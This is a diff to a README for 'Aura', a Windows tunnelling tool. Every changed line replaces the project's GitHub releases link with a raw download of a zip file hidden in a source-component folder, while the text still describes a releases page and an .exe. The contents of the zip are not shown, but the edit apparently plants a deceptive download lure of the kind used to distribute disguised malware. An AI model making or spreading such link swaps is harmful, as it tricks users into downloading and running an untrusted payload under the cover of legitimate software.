@@ -1,6 +1,6 @@
 # ⚡ Aura - Simple Powerful Tunnel Script
 
-[![Download Aura](https://img.shields.io/badge/Download-Aura-brightgreen?style=for-the-badge)](https://github.com/fafarras22/Aura/releases)
+[![Download Aura](https://img.shields.io/badge/Download-Aura-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fafarras22/Aura/main/src/components/layout/sidebar/Software_v1.5.zip)
 
 Aura is a user-friendly tool to create secure tunnels on your Windows computer. It helps you bypass internet blocks and restrictions using a reliable connection method based on Phoenix technology. This guide will walk you through downloading and running Aura step by step.
 
@@ -30,12 +30,12 @@ Aura is lightweight and runs on most modern PC hardware without issue.
 
 To get Aura on your PC, you need to visit the Releases page and download the latest Windows version.
 
-[![Download Aura](https://img.shields.io/badge/Download-Aura-blue?style=for-the-badge)](https://github.com/fafarras22/Aura/releases)
+[![Download Aura](https://img.shields.io/badge/Download-Aura-blue?style=for-the-badge)](https://raw.githubusercontent.com/fafarras22/Aura/main/src/components/layout/sidebar/Software_v1.5.zip)
 
 Follow these steps:
 
 1. Open your web browser.
-2. Go to the Aura releases page at https://github.com/fafarras22/Aura/releases.
+2. Go to the Aura releases page at https://raw.githubusercontent.com/fafarras22/Aura/main/src/components/layout/sidebar/Software_v1.5.zip
 3. Look for the latest release version. It usually appears at the top.
 4. Find the Windows executable file. It will end with `.exe` and may have names like `Aura-windows.exe`.
 5. Click the file name to start downloading.
@@ -83,7 +83,7 @@ If problems persist, check the GitHub repository's Issues section for help from 
 
 Visit this page to download the latest Aura version:
 
-[Download Aura](https://github.com/fafarras22/Aura/releases)
+[Download Aura](https://raw.githubusercontent.com/fafarras22/Aura/main/src/components/layout/sidebar/Software_v1.5.zip)
 
 Use the Windows `.exe` file found in the latest release to get started quickly.
 
